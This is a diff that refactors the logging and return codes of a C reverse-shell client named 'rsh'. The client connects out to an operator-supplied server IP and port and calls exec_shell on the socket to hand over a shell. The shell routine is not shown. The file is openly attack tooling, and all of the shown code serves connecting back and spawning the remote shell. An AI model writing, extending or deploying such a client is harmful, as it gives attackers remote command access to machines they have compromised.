@@ -6,7 +6,9 @@
 #include <sys/socket.h>
 #include <unistd.h>
 
-static void usage(char *progname) {
+#include "common.h"
+
+static void usage(const char *progname) {
   const char *banner =
     "          _       \n"
     " _ __ ___| |__    \n"
@@ -15,8 +17,7 @@ static void usage(char *progname) {
     "|_|  |___/_| |_|  \n"
     "(r)everse(sh)ell\n";
 
-  fprintf(stdout, "%s\nusage: %s -s <server_ip> -p <server_port>\n", banner,
-          progname);
+  rsh_log("%s\nusage: %s -s <server_ip> -p <server_port>\n", banner, progname);
 }
 
 static int parse_args(int argc, char *argv[], struct in_addr *addr,
@@ -38,8 +39,9 @@ static int parse_args(int argc, char *argv[], struct in_addr *addr,
     }
   }
 
-  if (!(*server_port) || !addr->s_addr)
+  if (!(*server_port) || !addr->s_addr) {
     return 1;
+  }
 
   return 0;
 }
@@ -60,25 +62,24 @@ static int run(struct sockaddr_in *addr) {
   addr->sin_family = AF_INET;
 
   if ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
-    fprintf(stderr, "[-] fail to create the communication socket!\n");
-
-    return EXIT_FAILURE;
+    rsh_error("fail to create the communication socket!\n");
+    return 1;
   }
 
-  fprintf(stdout, "[+] trying to connect to server...\n");
+  rsh_info("trying to connect to server...\n");
 
   if (connect(fd, (struct sockaddr *)addr, sizeof(struct sockaddr))) {
-    fprintf(stderr, "[-] fail to connect to server!\n");
+    rsh_error("fail to connect to server!\n");
     close(fd);
 
-    return EXIT_FAILURE;
+    return 1;
   }
 
-  fprintf(stdout, "[+] connection estabilished...\n");
+  rsh_info("connection estabilished...\n");
 
   exec_shell(fd);
 
-  return EXIT_SUCCESS;  // normally never reached
+  return 0;  // normally never reached
 }
 
 int main(int argc, char *argv[]) {
@@ -96,5 +97,5 @@ int main(int argc, char *argv[]) {
   // run the client
   ret = run(&addr);
 
-  exit(ret);
+  exit(!ret ? EXIT_SUCCESS : EXIT_FAILURE);
 }
